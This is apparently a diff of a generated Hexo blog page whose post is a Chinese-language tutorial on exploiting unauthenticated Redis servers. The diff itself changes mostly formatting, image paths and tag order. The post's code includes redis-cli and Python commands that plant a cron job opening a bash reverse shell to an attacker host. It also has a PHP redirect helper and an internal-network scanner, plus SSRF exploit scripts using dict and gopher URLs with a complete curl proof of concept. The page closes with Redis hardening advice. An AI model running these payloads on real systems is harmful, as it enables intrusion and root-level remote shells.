@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="generator" content="Hexo 3.8.0">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
@@ -117,9 +117,9 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 				
 					<a class="github" target="_blank" href="https://github.com/cckuailong/" title="github"><i class="icon-github"></i></a>
 		        
-					<a class="qq" target="_blank" href="/qq.jpg" title="qq"><i class="icon-qq"></i></a>
+					<a class="qq" target="_blank" href="/img/qq.jpg" title="qq"><i class="icon-qq"></i></a>
 		        
-					<a class="weixin" target="_blank" href="/wx.png" title="weixin"><i class="icon-weixin"></i></a>
+					<a class="weixin" target="_blank" href="/img/wx.png" title="weixin"><i class="icon-weixin"></i></a>
 		        
 					<a class="facebook" target="_blank" href="https://www.facebook.com/junjie.huo.18" title="facebook"><i class="icon-facebook"></i></a>
 		        
@@ -161,9 +161,9 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 					
 						<a class="github" target="_blank" href="https://github.com/cckuailong/" title="github"><i class="icon-github"></i></a>
 			        
-						<a class="qq" target="_blank" href="/qq.jpg" title="qq"><i class="icon-qq"></i></a>
+						<a class="qq" target="_blank" href="/img/qq.jpg" title="qq"><i class="icon-qq"></i></a>
 			        
-						<a class="weixin" target="_blank" href="/wx.png" title="weixin"><i class="icon-weixin"></i></a>
+						<a class="weixin" target="_blank" href="/img/wx.png" title="weixin"><i class="icon-weixin"></i></a>
 			        
 						<a class="facebook" target="_blank" href="https://www.facebook.com/junjie.huo.18" title="facebook"><i class="icon-facebook"></i></a>
 			        
@@ -179,7 +179,7 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Redis_getshell" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-Redis_getshell" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -199,6 +199,7 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
       
         <h2 id="一、前言："><a href="#一、前言：" class="headerlink" title="一、前言："></a>一、前言：</h2><p>Redis配置不当可能会导致未授权访问漏洞，本文利用此漏洞，通过cron进行Getshell，<br>并给出实际攻击场景中配合SSRF漏洞进行的反弹shell攻击，最后会给出Redis的正确<br>配置建议。</p>
 <a id="more"></a>
+
 <h2 id="二、Redis介绍："><a href="#二、Redis介绍：" class="headerlink" title="二、Redis介绍："></a>二、Redis介绍：</h2><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储<br>数据库。主流的30多种计算机编程语言都提供对Redis的支持。根据月度排行网站<br>DB-Engines.com的数据显示，Redis是最流行的键值对存储数据库。</p>
 <h2 id="三、漏洞介绍："><a href="#三、漏洞介绍：" class="headerlink" title="三、漏洞介绍："></a>三、漏洞介绍：</h2><ol>
 <li>Redis安装默认使用空口令（或管理员配置弱口令），会使暴露在公网上的Redis<br>服务受到严重的威胁。</li>
@@ -214,14 +215,12 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 <pre><code>config set dir /var/spool/cron    #设置文件保存路径
 config set dbfilename root        #设置文件名
 set xxx &quot;\n\n*/1**** /bin/bash -i &gt;&amp; /dev/tcp/#ip#/#port# 0&gt;&amp;1\n\n&quot;  #变量赋值
-save          #保存到文件中
-</code></pre><p>P.S. 第三句中写入文件的内容是cron的时程表格式 f1 f2 f3 f4 f5 program<br>语句表示，每隔一秒，执行一次bash反弹shell的命令</p>
+save          #保存到文件中</code></pre><p>P.S. 第三句中写入文件的内容是cron的时程表格式 f1 f2 f3 f4 f5 program<br>语句表示，每隔一秒，执行一次bash反弹shell的命令</p>
 <p>(2) linux中：</p>
 <pre><code>echo -e &quot;\n\n*/1**** /bin/bash -i &gt;&amp; /dev/tcp/#ip#/#port# 0&gt;&amp;1\n\n\n&quot; | redis-cli -h #ip# -x set xxx
 redis-cli -h #ip# config set dir /var/spool/cron
 redis-cli -h #ip# config set dbfilename root
-redis-cli -h #ip# save
-</code></pre><p>P.S. 可以发现这里bash语句最后多了一个’\n’，这是因为echo重定向后会自带一个’\n’</p>
+redis-cli -h #ip# save</code></pre><p>P.S. 可以发现这里bash语句最后多了一个’\n’，这是因为echo重定向后会自带一个’\n’</p>
 <p>(3) python版：</p>
 <pre><code>import redis
 
@@ -236,8 +235,7 @@ def getshell():
         pass
 
 if __name__ == &#39;__main__&#39;:
-    getshell()
-</code></pre><p>P.S. 上述getshell代码，在Redis服务由Root用户启动的情况下，可以将shell提权到Root权限。</p>
+    getshell()</code></pre><p>P.S. 上述getshell代码，在Redis服务由Root用户启动的情况下，可以将shell提权到Root权限。</p>
 <ol start="2">
 <li>配合ssrf漏洞进行利用（利用Redis漏洞的原理和上面基本一致）</li>
 </ol>
@@ -250,8 +248,7 @@ $port = $_GET[&#39;port&#39;];
 $scheme = $_GET[&#39;s&#39;];
 $data = $_GET[&#39;data&#39;];
 header(&quot;Location: $scheme://$ip:$port/$data&quot;);
-?&gt;
-</code></pre><p>1) 首先扫描内网开放6379端口（Redis服务）的主机：</p>
+?&gt;</code></pre><p>1) 首先扫描内网开放6379端口（Redis服务）的主机：</p>
 <pre><code>import requests
 import threading
 import Queue
@@ -297,8 +294,7 @@ for i in range(threads_count):
     t.setDaemon(True)
     t.start()
 while que.qsize() &gt; 0:
-    time.sleep(1.0)
-</code></pre><p>2) 通过ssrf漏洞结合Redis配置漏洞进行shell反弹</p>
+    time.sleep(1.0)</code></pre><p>2) 通过ssrf漏洞结合Redis配置漏洞进行shell反弹</p>
 <pre><code>import requests
 
 host = &#39;10.171.26.22&#39;
@@ -355,20 +351,16 @@ _payload = &#39;?s=dict%26ip={host}%26port={port}%26data=save&#39;.format(
 exp_uri = &#39;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#39;.format(_location, _payload, vul_httpurl=vul_httpurl)
 
 print exp_uri
-print len(requests.get(exp_uri).content)
-</code></pre><p>(2) 利用gopher协议</p>
+print len(requests.get(exp_uri).content)</code></pre><p>(2) 利用gopher协议</p>
 <p>如果目标curl配置了限制协议为Http, Https，dict方式就会失效，这时可以利用gopher协议进行getshell。<br>利用原理基本一致，但是把脚本转为gopher协议的格式比较棘手。</p>
 <p>先给出shell.sh, 上面有提到，这里为了方便再给出一下</p>
 <pre><code>echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/#ip#/#port# 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
 redis-cli -h $1 -p $2 config set dir /var/spool/cron/
 redis-cli -h $1 -p $2 config set dbfilename root
 redis-cli -h $1 -p $2 save
-redis-cli -h $1 -p $2 quit
-</code></pre><p>1) 获取Redis攻击的TCP数据包（需要提前获得服务器命令执行权限）<br>使用socat进行端口转发</p>
-<pre><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379
-</code></pre><p>将本地的4444端口转发到本地的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。<br>执行</p>
-<pre><code>bash shell.sh #servip# 4444
-</code></pre><p>捕获到数据如下（例）</p>
+redis-cli -h $1 -p $2 quit</code></pre><p>1) 获取Redis攻击的TCP数据包（需要提前获得服务器命令执行权限）<br>使用socat进行端口转发</p>
+<pre><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></pre><p>将本地的4444端口转发到本地的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。<br>执行</p>
+<pre><code>bash shell.sh #servip# 4444</code></pre><p>捕获到数据如下（例）</p>
 <pre><code>&gt; 2017/10/11 01:24:52.432446  length=85 from=0 to=84
 *3\r
 $3\r
@@ -421,8 +413,7 @@ save\r
 $4\r
 quit\r
 &lt; 2017/10/11 01:24:52.446148  length=5 from=0 to=4
-+OK\r
-</code></pre><p>2) 数据转换为gopher格式<br>转换规则：<br>● 如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。<br>● 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。<br>● 将\r字符串替换成%0d%0a<br>● 空白行替换为%0a</p>
++OK\r</code></pre><p>2) 数据转换为gopher格式<br>转换规则：<br>● 如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。<br>● 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。<br>● 将\r字符串替换成%0d%0a<br>● 空白行替换为%0a</p>
 <p>这里有个python脚本进行转换</p>
 <pre><code>import sys
 
@@ -448,16 +439,13 @@ with open(sys.argv[1]) as f:
         else:
             line = line.replace(&#39;\n&#39;, &#39;&#39;)
             exp = exp + line
-print exp
-</code></pre><p>转换结果：</p>
+print exp</code></pre><p>转换结果：</p>
 <pre><code>*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * 
 bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0a
 config%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/
 %0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a
-$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
-</code></pre><p>P.S. 需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度<br>为58个字节，上面的EXP即是</p>
-<pre><code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a
-</code></pre><p>3+51+4=58。如果想换成42.256.24.73，那么$58需要改成$61，以此类推就行。<br>然后将得到的gopher格式的结果进行urlencode编码<br>最终的Poc为</p>
+$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></pre><p>P.S. 需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度<br>为58个字节，上面的EXP即是</p>
+<pre><code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a</code></pre><p>3+51+4=58。如果想换成42.256.24.73，那么$58需要改成$61，以此类推就行。<br>然后将得到的gopher格式的结果进行urlencode编码<br>最终的Poc为</p>
 <pre><code>curl -v &#39;http://#servip#/exp.php?
 url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%
 250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2
@@ -466,29 +454,21 @@ A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%25
 set%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d
 %250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d
 %250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave
-%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#39;
-</code></pre><h2 id="五、配置建议"><a href="#五、配置建议" class="headerlink" title="五、配置建议"></a>五、配置建议</h2><ol>
+%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#39;</code></pre><h2 id="五、配置建议"><a href="#五、配置建议" class="headerlink" title="五、配置建议"></a>五、配置建议</h2><ol>
 <li>禁止一些高危命令（重启redis才能生效）<br>(1) 修改 redis.conf 文件，禁用远程修改 DB 文件地址</li>
 </ol>
 <pre><code>rename-command FLUSHALL &quot;&quot;
 rename-command CONFIG &quot;&quot;
-rename-command EVAL &quot;&quot;
-</code></pre><p>(2) 修改redis.conf文件，改变这些高危命令的名称</p>
+rename-command EVAL &quot;&quot;</code></pre><p>(2) 修改redis.conf文件，改变这些高危命令的名称</p>
 <pre><code>rename-command FLUSHALL &quot;name1&quot;
 rename-command CONFIG &quot;name2&quot;
-rename-command EVAL &quot;name3&quot;
-</code></pre><ol start="2">
+rename-command EVAL &quot;name3&quot;</code></pre><ol start="2">
 <li>以低权限运行 Redis 服务（重启redis才能生效）</li>
 <li>为 Redis 添加密码验证（重启redis才能生效）</li>
 <li>禁止外网访问 Redis（重启redis才能生效）<br>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</li>
 </ol>
-<pre><code>bind 127.0.0.1
-</code></pre><p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p>
-<ol start="5">
-<li>修改默认端口<br>修改配置文件redis.conf文件</li>
-</ol>
-<pre><code>Port 6379
-</code></pre><ol start="6">
+<pre><code>bind 127.0.0.1</code></pre><p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错<br>5. 修改默认端口<br>修改配置文件redis.conf文件</p>
+<pre><code>Port 6379</code></pre><ol start="6">
 <li>设置防火墙策略<br>设置IP白名单等过滤流量访问的策略。</li>
 </ol>
 
@@ -624,7 +604,7 @@ rename-command EVAL &quot;name3&quot;
       </style>
       <div id="vcomment" class="comment"></div>
 <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
 <script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script>
     var notify = 'false' == true ? true : false;
@@ -721,6 +701,10 @@ rename-command EVAL &quot;name3&quot;
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)">BGP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">Linux</a>
               </li>
              
@@ -733,23 +717,11 @@ rename-command EVAL &quot;name3&quot;
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">md5</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">git</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">大数据</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">BGP</a>
+                <a href="javascript:void(0)">大数据</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -765,6 +737,10 @@ rename-command EVAL &quot;name3&quot;
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Vulnerability</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">mysql</a>
               </li>
              
@@ -773,11 +749,15 @@ rename-command EVAL &quot;name3&quot;
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">Vulnerability</a>
+                <a href="javascript:void(0)">md5</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)">ssl</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">git</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -801,7 +781,7 @@ rename-command EVAL &quot;name3&quot;
         </div>
         <ul class="search-ul">
           <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
-            缺失模块。<br>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br> npm i hexo-generator-json-content --save<br><br>
+            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
             2、在根目录_config.yml里添加配置：
 <pre style="font-size: 12px;" q-show="jsonFail">
   jsonContent:
